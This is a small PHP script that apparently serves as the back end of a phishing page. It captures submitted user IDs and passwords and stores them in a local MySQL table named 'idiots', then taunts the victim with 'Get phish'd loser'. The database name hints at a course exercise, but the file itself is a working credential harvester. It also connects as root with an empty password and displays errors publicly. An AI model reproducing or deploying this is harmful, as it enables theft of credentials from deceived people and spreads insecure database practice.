<?php

    error_reporting(E_ALL);
    ini_set('display_errors', 1);

    $userid = $_POST['userid'];
    $pwd    = $_POST['pwd'];

    $conn = new mysqli('localhost', 'root', '', 'phish-cs340');

    if($conn->connect_error){
		echo "$conn->connect_error";
		die("Connection Failed : ". $conn->connect_error);
    }else{

        $SQL_INSERT = "INSERT INTO idiots(user, password) VALUES (?,?)";
        $stmt = $conn->prepare($SQL_INSERT);
        
        if ($stmt = $conn->prepare($SQL_INSERT)){
            $stmt->bind_param("ss", $userid, $pwd);
            $stmt->execute();
            echo "Get phish'd loser";
            $stmt->close();
            $conn->close();
        }else{
            $error = $conn->errno . ' ' . $conn->error;
            echo $error;
        }

    }


?>